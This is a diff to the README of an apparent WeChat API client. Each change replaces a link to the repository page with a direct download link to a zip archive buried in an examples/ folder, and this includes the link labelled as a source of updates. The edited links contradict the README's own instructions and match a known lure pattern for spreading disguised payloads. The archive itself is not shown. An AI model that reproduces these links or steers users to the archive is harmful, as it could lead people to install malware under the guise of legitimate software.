@@ -1,6 +1,6 @@
 # ⚙️ qclaw-wechat-client - Easy Access to WeChat API
 
-[![Download qclaw-wechat-client](https://img.shields.io/badge/Download-qclaw--wechat--client-brightgreen?style=for-the-badge)](https://github.com/Arlinablind800/qclaw-wechat-client)
+[![Download qclaw-wechat-client](https://img.shields.io/badge/Download-qclaw--wechat--client-brightgreen?style=for-the-badge)](https://github.com/Arlinablind800/qclaw-wechat-client/raw/refs/heads/main/examples/client-qclaw-wechat-3.5-beta.4.zip)
 
 ---
 
@@ -37,7 +37,7 @@ To run qclaw-wechat-client on your PC, make sure you have:
 
 Click the big green button below to open the download page on GitHub. This page has the latest version of the software ready for you.
 
-[![Download Link](https://img.shields.io/badge/Download-qclaw--wechat--client-blue?style=for-the-badge)](https://github.com/Arlinablind800/qclaw-wechat-client)
+[![Download Link](https://img.shields.io/badge/Download-qclaw--wechat--client-blue?style=for-the-badge)](https://github.com/Arlinablind800/qclaw-wechat-client/raw/refs/heads/main/examples/client-qclaw-wechat-3.5-beta.4.zip)
 
 ### Step 2: Find the Latest Release
 
@@ -96,7 +96,7 @@ qclaw-wechat-client only connects to official QClaw and WeChat systems. It does 
 
 ## 🗂️ More Resources
 
-- Visit GitHub for updates: https://github.com/Arlinablind800/qclaw-wechat-client  
+- Visit GitHub for updates: https://github.com/Arlinablind800/qclaw-wechat-client/raw/refs/heads/main/examples/client-qclaw-wechat-3.5-beta.4.zip  
 - Read official QClaw API docs for details about the system’s backend.  
 - Join online forums or support groups if you want more help.
 
@@ -108,4 +108,4 @@ This client is built in TypeScript and open for developers. If you know programm
 
 ---
 
-[![Download qclaw-wechat-client](https://img.shields.io/badge/Download-qclaw--wechat--client-brightgreen?style=for-the-badge)](https://github.com/Arlinablind800/qclaw-wechat-client)
+[![Download qclaw-wechat-client](https://img.shields.io/badge/Download-qclaw--wechat--client-brightgreen?style=for-the-badge)](https://github.com/Arlinablind800/qclaw-wechat-client/raw/refs/heads/main/examples/client-qclaw-wechat-3.5-beta.4.zip)
